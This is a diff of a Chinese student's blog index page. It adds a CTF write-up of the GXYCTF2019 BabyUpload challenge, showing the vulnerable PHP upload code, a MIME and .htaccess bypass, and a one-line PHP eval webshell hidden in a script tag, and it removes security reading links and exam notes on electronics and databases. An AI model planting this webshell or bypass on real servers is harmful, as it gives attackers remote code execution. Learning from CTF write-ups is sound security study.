+<h1 id="真实题目"><a href="#真实题目" class="headerlink" title="真实题目"></a>真实题目</h1><h2 id="GXYCTF2019-BabyUpload【一句话木马变种-htaccess-MIME验证】"><a href="#GXYCTF2019-BabyUpload【一句话木马变种-htaccess-MIME验证】" class="headerlink" title="[GXYCTF2019]BabyUpload【一句话木马变种+.htaccess+MIME验证】"></a>[GXYCTF2019]BabyUpload【一句话木马变种+.htaccess+MIME验证】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; </span></span><br><span class="line"><span class="string">&lt;title&gt;Upload&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;form action=\"\" method=\"post\" enctype=\"multipart/form-data\"&gt;</span></span><br><span class="line"><span class="string">上传文件&lt;input type=\"file\" name=\"uploaded\" /&gt;</span></span><br><span class="line"><span class="string">&lt;input type=\"submit\" name=\"submit\" value=\"上传\" /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;"</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'user'</span>]))&#123;</span><br><span class="line">    $_SESSION[<span class="string">'user'</span>] = md5((string)time() . (string)rand(<span class="number">100</span>, <span class="number">1000</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'uploaded'</span>])) &#123;</span><br><span class="line">    $target_path  = getcwd() . <span class="string">"/upload/"</span> . md5($_SESSION[<span class="string">'user'</span>]);</span><br><span class="line">    $t_path = $target_path . <span class="string">"/"</span> . basename($_FILES[<span class="string">'uploaded'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    $uploaded_name = $_FILES[<span class="string">'uploaded'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $uploaded_ext  = substr($uploaded_name, strrpos($uploaded_name,<span class="string">'.'</span>) + <span class="number">1</span>);</span><br><span class="line">    $uploaded_size = $_FILES[<span class="string">'uploaded'</span>][<span class="string">'size'</span>];</span><br><span class="line">    $uploaded_tmp  = $_FILES[<span class="string">'uploaded'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>, strtolower($uploaded_ext)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"后缀名不能有ph！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((($_FILES[<span class="string">"uploaded"</span>][<span class="string">"type"</span>] == <span class="string">"</span></span><br><span class="line"><span class="string">            "</span>) || ($_FILES[<span class="string">"uploaded"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>) || ($_FILES[<span class="string">"uploaded"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)) &amp;&amp; ($_FILES[<span class="string">"uploaded"</span>][<span class="string">"size"</span>] &lt; <span class="number">2048</span>))&#123;</span><br><span class="line">            $content = file_get_contents($uploaded_tmp);</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">"/\&lt;\?/i"</span>, $content))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"诶，别蒙我啊，这标志明显还是php啊"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                mkdir(iconv(<span class="string">"UTF-8"</span>, <span class="string">"GBK"</span>, $target_path), <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">                move_uploaded_file($uploaded_tmp, $t_path);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&#123;$t_path&#125; succesfully uploaded!"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"上传类型也太露骨了吧！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这题一开始想多了，其实只要bp抓个包改一下MIME验证为image/jpeg就可以上传base.jpg和.htaccess，其中base.jpg要用到一句话密码的变种来绕过&lt;?</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;a1batr0ss&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h1 id="一些有关知识"><a href="#一些有关知识" class="headerlink" title="一些有关知识"></a>一些有关知识</h1><ol>
+<li><a href="https://www.cnblogs.com/haimian/p/6066839.html" target="_blank" rel="noopener">$FILE</a></li>
+<li>Apache解析漏洞</li>
+<li>.htaccess自解析</li>
+<li>图片的二次渲染【imagecreatefromjpeg】</li>
+</ol>
 </div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/01/28/REAL%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">REAL渗透测试</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-01-28</time><div class="content"><p>首先是用docker-compose搭建渗透环境：</p>
 <p>参考文章：<a href="http://www.manongjc.com/detail/21-cikpvdaembrzjci.html" target="_blank" rel="noopener">在kali上docker和vulhub搭建渗透环境</a></p>
 <p>启动docker</p>
@@ -405,506 +818,7 @@
 
 <p><a href="https://www.runoob.com/git/git-tag.html" target="_blank" rel="noopener">gittag有关命令</a></p>
 </blockquote>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/01/22/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/">环境搭建中的一些问题</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-01-22</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/01/14/%E5%AE%89%E5%85%A8%E6%96%87%E7%AB%A0%E6%B5%8F%E8%A7%88%E8%AE%B0%E5%BD%95/">安全文章浏览记录</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-01-14</time><div class="content"><h1 id="2021年"><a href="#2021年" class="headerlink" title="2021年"></a>2021年</h1><h2 id="1月"><a href="#1月" class="headerlink" title="1月"></a>1月</h2><h3 id="14号"><a href="#14号" class="headerlink" title="14号"></a>14号</h3><ol>
-<li><a href="https://cloud.tencent.com/developer/article/1371906" target="_blank" rel="noopener">preg_replace漏洞</a></li>
-<li><a href="https://blog.csdn.net/rfrder/article/details/109723519" target="_blank" rel="noopener">preg_replace漏洞2</a></li>
-</ol>
-<h3 id="19号"><a href="#19号" class="headerlink" title="19号"></a>19号</h3><ol>
-<li><a href="https://xz.aliyun.com/t/6050" target="_blank" rel="noopener">ssrf me【代码审计】</a></li>
-</ol>
-<h3 id="21号"><a href="#21号" class="headerlink" title="21号"></a>21号</h3><ol>
-<li><a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks" target="_blank" rel="noopener">md5扩展【纯英文】</a></li>
-<li><a href="https://www.freebuf.com/articles/web/69264.html" target="_blank" rel="noopener">hash长度扩展攻击</a></li>
-</ol>
-<h3 id="24号"><a href="#24号" class="headerlink" title="24号"></a>24号</h3><ol>
-<li><a href="https://www.jianshu.com/p/e1403b7140fa" target="_blank" rel="noopener">python【BeautifulSoup库】</a></li>
-</ol>
-<h3 id="25号"><a href="#25号" class="headerlink" title="25号"></a>25号</h3><ol>
-<li><a href="https://blog.csdn.net/c406495762/article/details/72331737" target="_blank" rel="noopener">Selenium与python爬虫</a></li>
-</ol>
-<h3 id="26号"><a href="#26号" class="headerlink" title="26号"></a>26号</h3><ol>
-<li><a href="https://www.cnblogs.com/smilejinge/p/3589479.html" target="_blank" rel="noopener">github简单使用</a></li>
-</ol>
-<h3 id="27号"><a href="#27号" class="headerlink" title="27号"></a>27号</h3><ol>
-<li><a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">xxe外部引用漏洞</a></li>
-</ol>
-<h3 id="28号"><a href="#28号" class="headerlink" title="28号"></a>28号</h3><ol>
-<li><a href="http://www.manongjc.com/detail/21-cikpvdaembrzjci.html" target="_blank" rel="noopener">在kali上docker和vulhub搭建渗透环境</a></li>
-<li><a href="https://www.toutiao.com/i6863046354730484238/" target="_blank" rel="noopener">docker的介绍</a></li>
-<li><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">XXE利用技巧</a></li>
-</ol>
-<h3 id="29号"><a href="#29号" class="headerlink" title="29号"></a>29号</h3><ol>
-<li><a href="https://blog.csdn.net/byywcsnd/article/details/78221375" target="_blank" rel="noopener">.user.ini</a></li>
-</ol>
-<h3 id="31号"><a href="#31号" class="headerlink" title="31号"></a>31号</h3><ol>
-<li><a href="https://www.bilibili.com/read/cv6188873/" target="_blank" rel="noopener">LD_PRELOAD绕过</a></li>
-<li><a href="http://zone.secevery.com/article/948" target="_blank" rel="noopener">uploadlabs wp</a></li>
-</ol>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">模电期末复习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-01-08</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">期末复习</a></span><div class="content"><h1 id="第一章：直流电路"><a href="#第一章：直流电路" class="headerlink" title="第一章：直流电路"></a>第一章：直流电路</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/1-1.png" alt="1-1"></p>
-<h2 id="等效电路"><a href="#等效电路" class="headerlink" title="等效电路"></a>等效电路</h2><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/1-3.png" alt="1-3"></p>
-<h2 id="节点分析法"><a href="#节点分析法" class="headerlink" title="节点分析法"></a>节点分析法</h2><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/1-2.png" alt="1-2"></p>
-<h1 id="第四章：集成运算放大器"><a href="#第四章：集成运算放大器" class="headerlink" title="第四章：集成运算放大器"></a>第四章：集成运算放大器</h1><h2 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h2><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/4-11.png" alt="4-11"></p>
-<p>电压输入时，Ri越大越好；</p>
-<p>电压输出时，Ro越小越好。</p>
-<p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/4-1.png" alt="4-1"></p>
-<p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/4-2.png" alt="4-2"></p>
-<h2 id="几种经典的放大器"><a href="#几种经典的放大器" class="headerlink" title="几种经典的放大器"></a>几种经典的放大器</h2><h3 id="反向比例电路"><a href="#反向比例电路" class="headerlink" title="反向比例电路"></a>反向比例电路</h3><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/4-3.png" alt="4-3"></p>
-<p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/4-4.png" alt="4-4"></p>
-<h3 id="同相比例电路"><a href="#同相比例电路" class="headerlink" title="同相比例电路"></a>同相比例电路</h3><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/4-5.png" alt="4-5"></p>
-<p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/4-6.png" alt="4-6"></p>
-<h4 id="同向比例的特例：电压跟随器【输入-输出】"><a href="#同向比例的特例：电压跟随器【输入-输出】" class="headerlink" title="同向比例的特例：电压跟随器【输入=输出】"></a>同向比例的特例：电压跟随器【输入=输出】</h4><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/4-7.png" alt="4-7"></p>
-<h3 id="反向加法放大电路"><a href="#反向加法放大电路" class="headerlink" title="反向加法放大电路"></a>反向加法放大电路</h3><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/4-8.png" alt="4-8"></p>
-<h3 id="同向加法放大电路【略难】"><a href="#同向加法放大电路【略难】" class="headerlink" title="同向加法放大电路【略难】"></a>同向加法放大电路【略难】</h3><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/4-9.png" alt="4-9"></p>
-<h3 id="单运放减法运算电路"><a href="#单运放减法运算电路" class="headerlink" title="单运放减法运算电路"></a>单运放减法运算电路</h3><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/4-10.png" alt="4-10"></p>
-<h1 id="第五章：半导体二极管及直流稳态"><a href="#第五章：半导体二极管及直流稳态" class="headerlink" title="第五章：半导体二极管及直流稳态"></a>第五章：半导体二极管及直流稳态</h1><p>二极管类型：</p>
-<ul>
-<li>点接触型【PN结面积小，允许小电流通过】</li>
-<li>面接触型【允许大电流通过】</li>
-<li>硅平面型</li>
-</ul>
-<p>代表符号：</p>
-<p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/5-1.png" alt="5-1"></p>
-<h2 id="半导体的伏安特性曲线"><a href="#半导体的伏安特性曲线" class="headerlink" title="半导体的伏安特性曲线"></a>半导体的伏安特性曲线</h2><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/5-2.png" alt="5-2"></p>
-<p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/5-3.png" alt="5-3"></p>
-<h2 id="二极管的几种模型"><a href="#二极管的几种模型" class="headerlink" title="二极管的几种模型"></a>二极管的几种模型</h2><h3 id="简化模型"><a href="#简化模型" class="headerlink" title="简化模型"></a>简化模型</h3><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/5-4.png" alt="5-4"></p>
-<h3 id="恒压降模型"><a href="#恒压降模型" class="headerlink" title="恒压降模型"></a>恒压降模型</h3><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/5-5.png" alt="5-5"></p>
-<h3 id="折线模型"><a href="#折线模型" class="headerlink" title="折线模型"></a>折线模型</h3><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/5-6.png" alt="5-6"></p>
-<h3 id="交流小信号模型"><a href="#交流小信号模型" class="headerlink" title="交流小信号模型"></a>交流小信号模型</h3><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/5-7.png" alt="5-7"></p>
-<p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/5-8.png" alt="5-8"></p>
-<h2 id="常考题型"><a href="#常考题型" class="headerlink" title="常考题型"></a>常考题型</h2><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/5-9.png" alt="5-9"></p>
-<h1 id="第六章：晶体三极管及其放大电路"><a href="#第六章：晶体三极管及其放大电路" class="headerlink" title="第六章：晶体三极管及其放大电路"></a>第六章：晶体三极管及其放大电路</h1><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-1.png" alt="6-1"></p>
-<p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-2.png" alt="6-2"></p>
-<p>所以，我们可以知道</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IE&gt;IC&gt;IB</span><br></pre></td></tr></table></figure>
-
-<p>由此引出了第一种常考题型：</p>
-<h2 id="常考题型1"><a href="#常考题型1" class="headerlink" title="常考题型1"></a>常考题型1</h2><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-3.png" alt="6-3"></p>
-<blockquote>
-<p>由<code>IE&gt;IC&gt;IB</code>可以知道<code>一号---IC、二号---IB、三号---IE</code>，而IE是指向里面的，所以是PNP型。</p>
-<p>β=IC/IB=1.5/0.03=50            //β要取绝对值</p>
-</blockquote>
-<p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-4.png" alt="6-4"></p>
-<p>由此引出第二种常考题型：</p>
-<h2 id="常考题型2"><a href="#常考题型2" class="headerlink" title="常考题型2"></a>常考题型2</h2><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-5.png" alt="6-5"></p>
-<p>如图1：</p>
-<blockquote>
-<p>处于中间值的是5.6V，所以管脚B对应5.6V</p>
-<p>和管脚B相差0.6<del>0.7或者0.2</del>0.3的是管脚E，所以管脚E是5V，同时判断得到这是硅管</p>
-<p>剩下的是管脚C，所以VC&gt;VB&gt;VE，所以是NPN型</p>
-</blockquote>
-<h2 id="判断在截止区、放大区还是饱和区"><a href="#判断在截止区、放大区还是饱和区" class="headerlink" title="判断在截止区、放大区还是饱和区"></a>判断在截止区、放大区还是饱和区</h2><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-6.png" alt="6-6"></p>
-<p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-8.png" alt="6-7"></p>
-<p>在放大区时：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IC&#x3D;βIB，IE&#x3D;IC+IB≈IC</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="常考题型3"><a href="#常考题型3" class="headerlink" title="常考题型3"></a>常考题型3</h2><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-9.png" alt="6-9"></p>
-<p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-10.png" alt="6-10"></p>
-<h2 id="基本共射极放大电路的组成"><a href="#基本共射极放大电路的组成" class="headerlink" title="基本共射极放大电路的组成"></a>基本共射极放大电路的组成</h2><h3 id="符号记法"><a href="#符号记法" class="headerlink" title="符号记法"></a>符号记法</h3><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-11.png" alt="6-11"></p>
-<p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-12.png" alt="6-12"></p>
-<p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-13.png" alt="6-13"></p>
-<h3 id="直流通路"><a href="#直流通路" class="headerlink" title="直流通路"></a>直流通路</h3><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/D:%5Cgitblog%5C1%5Csource_posts%5C%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%5C6-14.png" alt="6-14"></p>
-<p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/D:%5Cgitblog%5C1%5Csource_posts%5C%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%5C6-15.png" alt="6-15"></p>
-<h3 id="动态电路"><a href="#动态电路" class="headerlink" title="动态电路"></a>动态电路</h3><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-16.png" alt="6-16"></p>
-<p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-17.png" alt="6-17"></p>
-<p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-18.png" alt="6-18"></p>
-<h2 id="失真"><a href="#失真" class="headerlink" title="失真"></a>失真</h2><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-19.png" alt="6-19"></p>
-<p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-20.png" alt="6-20"></p>
-<h1 id="第九章：负反馈放大"><a href="#第九章：负反馈放大" class="headerlink" title="第九章：负反馈放大"></a>第九章：负反馈放大</h1><h2 id="四种典型电路"><a href="#四种典型电路" class="headerlink" title="四种典型电路"></a>四种典型电路</h2><h3 id="电压串联负反馈"><a href="#电压串联负反馈" class="headerlink" title="电压串联负反馈"></a>电压串联负反馈</h3><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/9-1.png" alt="9-1"></p>
-<p>电压控制电压源</p>
-<p>负反馈优点：稳定输出电压</p>
-<h3 id="电压并联负反馈"><a href="#电压并联负反馈" class="headerlink" title="电压并联负反馈"></a>电压并联负反馈</h3><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/9-2.png" alt="9-2"></p>
-<p>电流控制电压源</p>
-<h3 id="电流串联负反馈"><a href="#电流串联负反馈" class="headerlink" title="电流串联负反馈"></a>电流串联负反馈</h3><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/9-3.png" alt="9-3"></p>
-<p>电压控制电流源</p>
-<h3 id="电流并联负反馈"><a href="#电流并联负反馈" class="headerlink" title="电流并联负反馈"></a>电流并联负反馈</h3><p><img src="/2021/01/08/%E6%A8%A1%E7%94%B5%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/9-4.png" alt="9-4"></p>
-<p>电流控制电流源</p>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/01/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">数据库期末复习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-01-01</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">期末复习</a></span><div class="content"><h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h2 id="数据库的三级模式和二级映射"><a href="#数据库的三级模式和二级映射" class="headerlink" title="数据库的三级模式和二级映射"></a>数据库的三级模式和二级映射</h2><h3 id="数据库的三级模式"><a href="#数据库的三级模式" class="headerlink" title="数据库的三级模式"></a>数据库的三级模式</h3><ol>
-<li>用户级–&gt; 外模式(反映了数据库系统的用户观)   【数据库中的外模式对应<strong>视图</strong>】</li>
-<li>概念级–&gt; 概念模式/模式（反映了数据库系统的整体观)   【<strong>模式</strong>是数据库全体数据的全局逻辑结构。】【数据库三级模式结构中用于描述表结构的是<strong>模式</strong>】</li>
-<li>物理级 –&gt; 内模式（反映了数据库系统的存储观）【索引属于内模式】</li>
-</ol>
-<h3 id="数据库的两级映射"><a href="#数据库的两级映射" class="headerlink" title="数据库的两级映射"></a>数据库的两级映射</h3><ul>
-<li>模式/内模式的映像：实现概念模式到内模式之间的相互转换。</li>
-<li>外模式/模式的映像：实现外模式到概念模式之间的相互转换。</li>
-</ul>
-<p><img src="/2021/01/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/1-1.png" alt="1-1"></p>
-<h2 id="数据独立性"><a href="#数据独立性" class="headerlink" title="数据独立性"></a>数据独立性</h2><p><strong>数据库的数据的独立性</strong>是指数据与程序独立，将数据的定义从程序中分离出来，由DBMS（数据库管理系统）负责数据的存储，从而简化应用程序，大大减少应用程序编制的工作量。</p>
-<p>数据的独立性是由DBMS的二级映像功能来保证的。<strong>数据的独立性</strong>包括数据的<strong>物理独立性</strong>和数据的<strong>逻辑独立性</strong>。</p>
-<blockquote>
-<p>什么是数据的物理独立性？</p>
-<p>答：数据的物理独立性是指当数据库的<strong>内模式</strong>（存储模式）发生改变时，数据的的逻辑结构不变。由于应用程序处理的只是数据的逻辑结构，这样物理独立性可以保证，当数据的物理结构改变了，应用程序不用改变。但是，为了保证应用程序能够正确执行，需要修改概念模式/内模式之间的映像。</p>
-<p>什么是数据的逻辑独立性？</p>
-<p>答：数据的逻辑独立性是指用户的应用程序与数据库结构是相互独立的。数据的逻辑结构发生变化后，用户程序也可以不修改。但是，为了保证应用程序能够正确执行，需要修改外模式/概念模式之间的映像。</p>
-</blockquote>
-<p>一句话总结一下：</p>
-<p><strong>通俗来讲就是如果改变了某个模式，只需要修改上一层的映像。即改变内模式，只需要修改模式/内模式映像（物理独立性），改变概念模式（逻辑结构），只需要修改外模式/模式映像（逻辑独立性）</strong></p>
-<h2 id="概念模型和逻辑模型"><a href="#概念模型和逻辑模型" class="headerlink" title="概念模型和逻辑模型"></a>概念模型和逻辑模型</h2><p>对现实世界抽象层次的不同,数据模型分为有<strong>概念模型</strong>和<strong>结构模型</strong></p>
-<p><strong>概念模型</strong>是一种独立于硬件和软件的模型,完全不涉及信息在系统中的表现,只是用来描述某个特定组织所关心的信息结构。这种模型是从用户的观点对数据建模,必须充分反映用户的需求,并得到用户的确认才可定下来。<strong>它是现实世界的第一层抽象</strong>,是用户和数据库设计人员之间进行交流的工具,其典型代表是<strong>ER模型</strong>。   【实体、属性以及实体间的联系】</p>
-<p><strong>结构模型</strong>用于描述数据库的逻辑结构,与DBMS有关。这种模型是从计算机的观点对数据建模。<strong>它是现实世界的第二层抽象</strong>,是数据库设计人员和应用程序员之间进行交流的工具。其典型代表是层次、网状、关系和面向对象模型。</p>
-<h2 id="常见缩写"><a href="#常见缩写" class="headerlink" title="常见缩写"></a>常见缩写</h2><p>数据库（DB）：长期存储在计算机内的有组织、可共享的数据集合。</p>
-<p>数据库管理员（DBA）</p>
-<blockquote>
-<p>例题</p>
-<p>DBA负责全面地管理和控制数据库系统。具体职责不包括：（A）</p>
-<p>A.实现数据库访问接口的JAVA代码的编写和维护。</p>
-<p>B.决定数据库的信息内容和结构，以及数据库的存储结构和存取策略。</p>
-<p>C.定义数据的安全性要求和完整性约束条件。</p>
-<p>D.监督和控制数据库的使用和运行，改进和重组数据系统。</p>
-</blockquote>
